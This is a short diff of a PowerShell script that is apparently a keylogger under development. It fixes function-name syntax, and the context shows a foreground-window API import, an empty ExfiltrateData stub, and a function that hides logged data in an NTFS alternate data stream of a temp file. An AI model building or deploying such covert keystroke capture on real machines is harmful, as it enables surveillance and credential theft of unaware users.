@@ -34,11 +34,11 @@ $foreground_sig = @'
 public static extern IntPtr GetForegroundWindow();
 '@
 
-function $ExfiltrateData(){
+function ExfiltrateData(){
 
 }
 
-function $WriteFileStream( $Logdata ){
+function WriteFileStream( $Logdata ){
 	$file = "$env:temp\test_keylogger.txt"
 	Set-Content -Path $file -Value 'Some Data'
 	Add-Content -Path $file -Value $Logdata -Stream 'Metadata'
